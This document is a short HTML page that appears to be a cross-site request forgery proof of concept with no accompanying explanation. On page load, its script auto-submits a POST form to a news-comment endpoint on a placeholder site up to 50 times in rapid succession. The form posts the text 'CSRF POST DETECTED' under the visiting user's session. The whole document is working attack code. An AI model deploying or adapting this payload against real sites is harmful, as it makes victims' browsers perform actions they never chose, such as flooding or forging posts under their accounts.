<script type="text/javascript">
    let qtd = 0;
    let seconds = 2;
    const limit = 50;

    function send() {
        if (qtd < limit) {
            document.attack.submit();
        }
        qtd++;
    }

    function start() {
        seconds *= 10;
        window.setInterval(() => {
            send()
        }, seconds);
    }
</script>

<body onload="start();">
<form action="http://www.test.com/?pag=news&str=VIEW&id=ID-HERE&cmd=comment" name="attack" method="POST" target="_blank">
    <input type="text" name="Character" id="Character" value="Test">
    <input type="text" name="Text" id="Text" value="CSRF POST DETECTED">
    <input type="hidden" name="action" value="true">
    <input type="submit" value="Send">
</form>
